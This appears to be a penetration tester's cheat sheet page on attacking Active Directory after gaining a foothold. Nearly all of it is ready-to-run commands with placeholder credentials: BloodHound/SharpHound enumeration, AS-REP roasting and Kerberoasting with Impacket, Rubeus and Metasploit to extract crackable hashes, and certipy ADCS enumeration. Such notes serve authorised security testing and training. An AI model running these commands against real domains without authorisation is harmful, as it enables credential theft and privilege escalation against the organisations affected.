---
description: Enumerate Active Directory from authenticated perspective
---

# AD Foothold

## Bloodhound Ingestion

{% tabs %}
{% tab title="Linux (Python Ingestor)" %}
```bash
bloodhound-python -u '$u'@'$d' -p '$p' -c All
```
{% endtab %}

{% tab title="Windows (Official C# Ingestor SharpHound)" %}
```powershell
.\SharpHound.exe --Domain $domain
```


{% endtab %}
{% endtabs %}

analyze in bloodhound CE for escalation paths from owned principals. Redo this as you  &#x20;

## AS-REP Roasting

Accounts that dont have "Kerberos pre-authentication required" enabled are vulnerable. A valid domain account is needed to check for the state of that attribute. If you know an account is vulnerable or want to guess you can request anonymously.

{% tabs %}
{% tab title="Linux (Impacket)" %}
```bash
GetNPUsers.py '$d'/'$u':'$p' -request -format hashcat -outputfile asrephashes
```


{% endtab %}

{% tab title="Windows (Rubeus)" %}
```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:$u]
```
{% endtab %}
{% endtabs %}

## Kerberoasting

AD service accounts have the "ServicePrincipalName" property set. The TGS can be cracked offline if you have valid AD creds to request it.

{% tabs %}
{% tab title="Linux (Impacket)" %}
```
GetUserSPNs.py -request -dc-ip $dcip '$d'/'$u' -outputfile kerberoasthashes
```
{% endtab %}

{% tab title="Linux (msf)" %}
```
use auxiliary/gather/get_user_spns
```
{% endtab %}
{% endtabs %}

## ADCS Enumeration

{% tabs %}
{% tab title="Linux (certipy)" %}
```
certipy find -u '$u'@'$d' -p '$p' -target $dcip
```
{% endtab %}
{% endtabs %}



## # SCCM Enumeration

TODO: add sccmhunter and how to obtain and crack the NAA join from DHCP
